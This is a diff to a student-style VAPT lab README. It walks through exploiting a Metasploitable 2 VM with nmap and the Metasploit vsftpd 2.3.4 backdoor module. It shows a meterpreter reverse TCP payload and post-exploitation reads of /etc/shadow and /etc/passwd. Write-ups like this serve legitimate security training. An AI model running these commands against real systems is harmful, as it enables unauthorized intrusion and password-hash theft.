@@ -8,13 +8,13 @@ Hands-on vulnerability assessment and penetration testing lab on Metasploitable 
 -  In a VAPT workflow, Nmap acts as the primary tool during the reconnaissance phase to build a
   map of the target's attack surface
 
-# Command Used in This Step
+### Command Used in This Step
 
--sudo nmap --script=vuln 192.168.0.113
+sudo nmap --script=vuln 192.168.0.113
 
 <img width="1920" height="950" alt="image" src="https://github.com/user-attachments/assets/7416f651-3bdd-4e8c-ba7b-cafa7645e3d1" />
 
-# What this command does. 
+## What this command does. 
 
 - sudo: Runs the command with administrative privileges, which allows Nmap to craft raw network packets for accurate scanning.
 - nmap: Invokes the scanner tool
@@ -27,11 +27,11 @@ Hands-on vulnerability assessment and penetration testing lab on Metasploitable 
 - 2. Samba (SMB on Ports 139/445):** The active Samba service was targeted due to a command injection vulnerability (`usermap_script`), enabling remote code execution (RCE) with administrative privileges.
 - These two entry points were prioritized to demonstrate service-level exploitation and privilege.
 
+-----
 
-
-### Phase 2: Exploitation - vsftpd 2.3.4 Backdoor
-
-### Step 1 Launching Metasploit and Searching for the Exploit Module
+# Phase 2: Exploitation - vsftpd 2.3.4 Backdoor
+-----
+## Step 1 Launching Metasploit and Searching for the Exploit Module
 
 - After identifying the open FTP service during the scanning phase, I opened a new terminal and launched the Metasploit Framework console (`msfconsole`). 
 - I then searched for available exploit modules targeting the `vsftpd` service using the following command.
@@ -39,9 +39,10 @@ Hands-on vulnerability assessment and penetration testing lab on Metasploitable 
 - msfconsole
 - msf > search vsftp
 <img width="1920" height="950" alt="Screenshot_2026-10-17_12_01_18" src="https://github.com/user-attachments/assets/f10b3e83-e9a8-4f7e-bff0-4313695ce6b1" />
+
 # Observations & Output:
 
-# The search query returned two matching modules:   
+## The search query returned two matching modules:   
 
 - 0 auxiliary/dos/ftp/vsftpd_232 (Denial of Service).
 
@@ -49,7 +50,7 @@ Hands-on vulnerability assessment and penetration testing lab on Metasploitable 
 
 - msf > use 1
   
-### Step 2: Inspecting Exploit Options
+## Step 2: Inspecting Exploit Options
 
 Once the `vsftpd_234_backdoor` module was selected, I inspected the configurable parameters and payload options to ensure everything was properly aligned before launching the attack.
 
@@ -58,7 +59,7 @@ bash
 <img width="1920" height="950" alt="Screenshot_2026-10-17_12_01_36" src="https://github.com/user-attachments/assets/d9dc34b9-9081-460d-9ea3-9e6326bc42bf" />
 
 
-# Commands Explained:
+### Commands Explained:
 
 show options: Displays all the configurable parameters for the selected exploit module and its payload.
 
@@ -68,7 +69,7 @@ show options: Displays all the configurable parameters for the selected exploit 
 
 - Payload Settings: The default payload (cmd/linux/http/x86/meterpreter_reverse_tcp) handles the connection back to our attack machine once the backdoor is triggered.
 
-### Step 3: Configuring Target and Local Host Parameters
+## Step 3: Configuring Target and Local Host Parameters
 
 Before launching the attack, I configured the required parameters so the exploit knows where to send the attack and where to receive the incoming connection.
 
@@ -79,7 +80,7 @@ bash
 
 <img width="1920" height="950" alt="Screenshot_2026-10-17_12_02_40" src="https://github.com/user-attachments/assets/b6dc6cc8-ac1c-4ecd-b740-6410a6361ded" />
 
-# Commands Explained:
+### Commands Explained:
 
 - set RHOSTS 192.168.0.113: Defines the Remote Host (target machine IP address) that we want to exploit.
 
@@ -88,7 +89,7 @@ bash
 - show options: Verified again to ensure both RHOSTS and LHOST were updated successfully before executing the exploit.
 
 
-### Step 4: Executing the Exploit & Establishing a Meterpreter Session
+## Step 4: Executing the Exploit & Establishing a Meterpreter Session
 
 After configuring the target and local IP addresses, I disabled the automatic check to force the exploit execution and successfully launched the attack against the target machine.
 
@@ -136,7 +137,7 @@ Observation: Verified the target's internal IP address (192.168.0.113) and loopb
 
 
 
-### Step 5: Post-Exploitation & Dumping Sensitive System Files
+## Step 5: Post-Exploitation & Dumping Sensitive System Files
 
 After obtaining root-level access via the `vsftpd` backdoor, I performed post-exploitation activities to extract sensitive authentication and user configuration files from the target system.
 
@@ -148,25 +149,29 @@ bash
 - meterpreter > shell
 - Process 4730 created.
 - Channel 1 created.
+- cat /etc/shadow
 
 <img width="1920" height="950" alt="Screenshot_2026-10-17_12_05_02" src="https://github.com/user-attachments/assets/869c3485-6803-4378-a3d8-8ae28d500b61" />
-cat /etc/shadow
-```[cite: 7]
 
-* **What it does:** The `/etc/shadow` file on Linux systems stores secure password hashes for all local user accounts.
-* **Observations:** 
-  * Successfully extracted password hashes for system users (such as `root`, `msfadmin`, `postgres`, `ftp`, etc.)[cite: 7].
-  * These hashes can potentially be used in offline password cracking attacks (using tools like John the Ripper or Hashcat) to test password strength.
 
----
 
+ What it does: The `/etc/shadow` file on Linux systems stores secure password hashes for all local user accounts.
+ 
+ Observations: 
+  Successfully extracted password hashes for system users (such as `root`, `msfadmin`, `postgres`, `ftp`, etc.)[cite: 7].
+   These hashes can potentially be used in offline password cracking attacks (using tools like John the Ripper or Hashcat) to test password strength.
+----
 #### 2. Enumerating User Accounts (`/etc/passwd`)
 Next, I checked the system's user account database to understand the user structure and active shells configured on the machine[cite: 8].
 
-```bash
-cat /etc/passwd
-```[cite: 8]
+bash
+- cat /etc/passwd
 
-* **What it does:** The `/etc/passwd` file contains public account information, listing all valid usernames, user IDs (UID), group IDs (GID), home directories, and their assigned default login shells[cite: 8].
-* **Observations:**
-  * Identified active users and their respective home paths (e.g., `/home/msfadmin`, `/home/user`) along with system daemons that have restricted or no login access (`/bin/false` or `/sbin/nologin`)[cite: 8].
+<img width="1920" height="950" alt="Screenshot_2026-10-17_12_05_11" src="https://github.com/user-attachments/assets/e2f4ed9b-1385-49e3-ac4b-bb77b2c19e79" />
+
+What it does: The `/etc/passwd` file contains public account information, listing all valid usernames, user IDs (UID), group IDs (GID), home directories, and their assigned default login shells[cite: 8].
+
+Observations: Identified active users and their respective home paths (e.g., `/home/msfadmin`, `/home/user`) along with system daemons that have restricted or no login access (`/bin/false` or `/sbin/nologin`)[cite: 8].
+
+
+
